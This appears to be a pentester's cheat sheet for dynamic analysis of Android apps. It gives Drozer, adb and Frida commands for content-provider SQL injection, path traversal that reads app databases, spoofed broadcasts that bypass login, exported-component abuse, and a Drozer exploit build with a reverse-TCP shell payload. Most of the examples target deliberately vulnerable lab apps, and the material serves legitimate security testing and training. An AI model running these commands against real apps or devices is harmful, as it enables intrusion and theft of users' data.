# Dynamic Analysis
In the docs, MAHH = [Mobile Application Hacker’s Handbook](https://github.com/mohammedshine/MOBILEAPP_PENTESTING_101/blob/bce9450a121abfd6420d0df6717471255ad99d3f/PDF/Mobile%20App%20Hackers%20Handbook.pdf)

{% embed url="https://mas.owasp.org/MAS_checklist/" %}
OWASP checklist
{% endembed %}

{% embed url="https://dsopas.github.io/MindAPI/play/" %}
MindMap
{% endembed %}

## Tools
### Drozer
```bash
git clone https://github.com/FSecureLABS/drozer.git
cd drozer
make deb
# or :
wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer_2.4.4.deb
dpkg -i drozer_2.4.4.deb

# install drozer agent on device
wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
adb install drozer-agent-2.3.4.apk

# open drozer agent app on device : turn it "on"
adb forward tcp:31415 tcp:31415

drozer console connect
```
#### Commands
{% embed url="https://gist.github.com/castexyz/2ef12840fccbf3b4ef7b6446d24a9352" %} Drozer commands {% endembed %}
```bash
# on drozer console
drozer console connect

'''
Info Gathering / Basics
'''
# list modules
list
# get packages list
run app.package.list -f $filter

# get basic info of package
run app.package.info -a $package_app

# view copied text via clipboard
run post.capture.clipboard

# dump androidmanifest.xml file
run app.package.manifest $package_app

# identify weaknesses
run app.package.attacksurface $package_app

# list exported activities / find private activities
run app.activity.info -a $package_app

# find browsable activities
run scanner.activity.browsable

# finding if app allows its data to be backed up
run app.package.backup -f $package_app

# bypass exported activity

# launch activity
run app.activity.start --component $package_app $package_app.$activity

'''
WebView
'''
# find if webview is exploitable
run scanner.misc.checkjavascriptbridge -a $package_app

'''
Content providers
'''
# get infos about content providers
run app.provider.info -a $package_app
# content provider vulnerabilities
run scanner.provider.injection -a $package_app
run scanner.provider.traversal -a $package_app

# Database-backed Content Providers (Data Leakage)
run scanner.provider.finduris -a $package_app
# query accessible content URIs
run app.provider.query content://$content

# Database-backed Content Providers (SQLi)
run app.provider.query content://$accessible_content
--projection "'"
run app.provider.query content://$accessible_content
--selection "'"

'''
Services
'''
# list service
run app.service.info -a $package_app
# interact with service
# app.service.send 
# app.service.start  # Start Service                                       
# app.service.stop   # Stop Service
run app.service.send $package_app $ $package_app.$service --msg 2354 9234 1 --extra string $package_app.PIN 1337 --bundle-as-obj

'''
Broadcast Receivers
'''
# broadcast receivers
run app.broadcast.info # Detects all broadcast receivers on device
# check for app
run app.broadcast.info -a $package_app
# interactions
# app.broadcast.info          Get information about broadcast receivers           
# app.broadcast.send          Send broadcast using an intent                      
# app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
# i.e. : send SMS on app
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"

'''
Debug
'''
# find debuggable apps
run app.package.debuggable

# You can run commands as that app if it is debuggable
shell@android:/ $ run-as $package_app

'''
Exploits / Shellcode
'''
# on host terminal
drozer exploit list
drozer shellcode list

# example : CVE-2010-1807
drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi  
--server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html
```
### PID Cat
>Tool showing log entries for a specific application package when ``debug=true`` in the application.
```bash
# installation
git clone https://github.com/JakeWharton/pidcat.git
cd pidcat

# usage
python pidcat.py $package_name
```

## Inspeckage
{% embed url="https://github.com/ac-pm/Inspeckage/releases" %}
>**Information gathering**
>- Requested Permissions;
>- App Permissions;
>- Shared Libraries;
>- Exported and Non-exported Activities, Content Providers,Broadcast Receivers and Services;
>- Check if the app is debuggable or not;
>- Version, UID and GIDs;
>
>**Hooks**
*With the hooks, we can see what the application is doing in real time:*
>- Shared Preferences (log and file);
>- Serialization;
>- Crypto;
>- Hashes;
>- SQLite;
>- HTTP (an HTTP proxy tool is still the best alternative);
>- File System;
>- Miscellaneous (Clipboard, URL.Parse());
>- WebView;
>- IPC.
```bash
adb install mobi.acpm.inspeckage.apk
# go to the device : launch inspeckage
# open web browser : http://127.0.0.1:8008 on mobile
```

## Manual
### Exported Activities / Service
In **AndroidManifest.xml**, check for exported activities :
```bash
cat AndroidManifest.xml | grep 'exported="true"'

# true : activity can be launched by any other applications.
# false : only the application can launch it.

# launch exported activity
adb shell am start -n $package_name/.$activity

# or drozer
```

#### Exploit Service (1)
{% embed url="https://manifestsecurity.com/android-application-security-part-16/" %}
>When a service is exported without any permission restriction, any application can bind to the service and access the function implemented in the service.

```bash
# start
adb shell am startservice app.beetlebug/app.beetlebug.handlers.VulnerableService
# stop
adb shell am force-stop app.beetlebug/app.beetlebug.handlers.VulnerableService
# status
dumpsys activity services $server_service
```

#### Exploit Service (2)
1. Get Services
```bash
dz> run app.service.info -a com.mwr.example.sieve
```
2. Exploiting **handleMessage()** function in sieve (Code analysis of AuthService services)
```bash
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```
- In above request, PIN 1337 can be bruteforced.
- Refer to Page 211 of **MAHH**.
3. Exploiting **CryptoService** to encrypt a message
```bash
dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService --msg 3452 2 3 --extra string com.mwr.example.sieve.KEY testpassword --extra string com.mwr.example.sieve.STRING "string to be encrypted" --bundle-as-obj
```
>The parameters passed in **--msg** are extra parameters. Analyze code and use the parameters mentioned there, and add extra till 3 parameters are completed. 
>**--msg** expects three parameters.

### Vulnerable Content Provider
{% embed url="https://redfoxsec.com/blog/exploiting-content-providers/" %}
>A content provider component **supplies data from one application to others** on request. Such requests are handled by the methods of the ContentResolver class. A content provider can use different ways to store its data and the data can be **stored** in a **database**, in **files**, or even over a **network**.

```bash
cat AndroidManifest.xml | grep "<provider"
# search for :
# android:enabled="true"
# android:exported="true"
# check the permissions

# drozer console
run app.provider.info -a $package_app
# check source code for content providers URI

# query it :
run app.provider.query $content_provider_URI --vertical
```

#### SQLi's
1. SQLi on Content provider connected to DB using projection parameter
```bash
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "'"
```
2. Automating SQLi on Content Providers
```bash
dz> run scanner.provider.sqltables -a content://com.mwr.example.sieve.DBContentProvider/Passwords
```
3. Used to start a localhost server to show content providers and run sqlmap like tools
```bash
dz> run auxiliary.webcontentresolver -p 9999
```
4. Automating SQLi scan on all content providers on the device
```bash
dz> run scanner.provider.injection
```

#### Traversals
1. Reading external files using Content Providers
```bash
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
```

2. Directory Traversal to read /databases in sieve
```bash
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/../../../../data/data/com.mwr.example.sieve/databases/database.db >database.db
```

3. Automating Traversals
```bash
dz> run scanner.provider.traversal -a content://com.mwr.example.sieve.FileBackupProvider
```

### Insecure Logging
Sensitive information, (usernames, passwords, and other user data), is stored or printed in an insecure manner. This means that this information is easily accessible to anyone with access to the logs, which could potentially be a malicious actor who gains access to the device.

```bash
# make sure you installed frida
# find pid of app
frida-ps -Uai

# get logs of the app :
adb logcat --pid=2244

# find logged infos by the app when you log in, etc
adb logcat --pid=2244 | grep "password"
``` 

### Input Validation Issues
Input data from users, such as login credentials, user input, and other user-generated data, is not properly validated before being used by the application. 
**Check for :**
- SQLi
- XSS
- Code Injection
- BOF
- File Inclusion
- etc.

### Access Control Issues
Access controls, such as authentication and authorization mechanisms, are not properly implemented or enforced. This can lead to unauthorized access to sensitive information, data theft, and other security breaches.

**Try to access "sensitive" activities from outside the app :**
```bash
# list activities with adb
adb shell dumpsys package | grep -i ' + package.name + ' | grep Activity

# use adb
adb shell am start -n $app_name/.$activity

# Let’s try to access activity using content provider.
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes/

adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```

### Deep Link Exploitation
**[What is it ?](https://developer.android.com/training/app-links/deep-linking)** 
>Deep links are basically hyperlinks that allow users to directly open specific views inside an android application.
Examine the AndroidManifest.xml file and search for android:scheme attributes inside `<data>` tags to find the deep link defined.
- **Explanations** : 
	- [Deep Link Exploitation - AllSafe](https://justahmed.github.io/android/Allsafe-Walkthrough-Part-1/#8-deep-link-exploitation)
	- [Deep Links URL Schemes - HackTricks](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-applications-basics#deep-links-url-schemes)

```bash
cat AndroidManifest.xml | grep "<data"
# locate scheme, host and pathPrefix
# query
adb shell am start -a android.intent.action.VIEW -d "scheme://hostname/path?param=value" $package_name
```

### WebView Attacks
{% embed url="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/webview-attacks" %}

{% embed url="https://labs.f-secure.com/advisories/webview-addjavascriptinterface-remote-code-execution/" %}

>WebView is a view that allows an application to load web pages within it. Internally it uses web rendering engines such as Webkit. The Webkit rendering engine was used prior to Android version 4.4 to load these web pages. On the latest versions (after 4.4) of Android, it is done using Chromium. When an application uses a WebView, it is run within the context of the application, which has loaded the WebView. To load external web pages from the Internet, the application requires INTERNET permission in its `AndroidManifest.xml` file:

```xml
<uses-permission android:name="android.permission.INTERNET"></uses-permission>
```
- **Accessing sensitive local resources through file scheme**
When an Android application uses a WebView with user controlled input values to load web pages, it is possible that users can also read files from the device in the context of the target application.

### Insecure Broadcast Receiver
>BroadcastReceiver is an android component that listens to system-wide broadcast events or intents. Examples of these broadcasts are when your phone’s battery is running low then a broadcast indicating the low battery condition is sent. Some apps could be configured to listen for this broadcast and lower its power consumption and maybe lower the brightness on your screen, etc…

#### How to Exploit
1. Examine AndroidManifest.xml
	1. Check for `<receiver>` tags
2. Check in the code where the broadcast receiver is, for the `onReceive`function and see how it handles broadcasts it receives.
3. Try to exploit it by sending customized notification
- **[Exploiting It](https://resources.infosecinstitute.com/topic/android-hacking-security-part-3-exploiting-broadcast-receivers/)**

#### Exploit Example
1. Fetch Broadcast Receivers
```bash
dz> run app.broadcast.info -a com.mwr.example.browser
```

2. If an app expects a broadcast receiver to catch an intent and then show authenticated activities, generation of that broadcast is only possible after login. But after code review,  an attacker can manually send that intent using drozer.
Sample broadcast receiver:

 ```xml
<receiver android:name=".LoginReceiver"
 android:exported="true">
 <intent-filter>
 <action android:name="com.myapp.CORRECT_CREDS" />
 </intent-filter>
 </receiver>
```

```bash
dz> run app.broadcast.send --action com.myapp.CORRECT_CREDS
```
(Page 217 - MAHH)

3. Intent Sniffing/Catching intents using broadcast receivers which were meant for other Broadcast Receivers
```bash
dz> run app.broadcast.sniff --action android.intent.action.BATTERY_CHANGED
dz> run app.broadcast.sniff --action com.myapp.USER_LOGIN
``` 
(name of action sending the broadcast)

### Weak Cryptography
>Use frida to hook some encryption methods and obtain sensitive information like Encryption key, IV Encryption Algorithm, etc…

```bash
frida -U --codeshare fadeevab/intercept-android-apk-crypto-operations -f $package
```

### Object Deserialization
>Taking data structured in some format, and rebuilding it into an object.
- Explanations : https://justahmed.github.io/android/Allsafe-Walkthrough-Part-1/#14-object-serialization

### Insecure Providers
The goal is to assess the implementation and see if you can leak both info from the database and sensitive files accessed by the File Provider.
1. Check AndroidManifest.xml and search for `<provider>` tags
	1. For this provider :
```xml
<provider android:name="infosecadventures.allsafe.challenges.DataProvider" android:enabled="true" android:exported="true" android:authorities="infosecadventures.allsafe.dataprovider"/>
```
**It is exported, so easier. Query it :**
```bash
adb shell content query --uri "content://infosecadventures.allsafe.dataprovider"
```


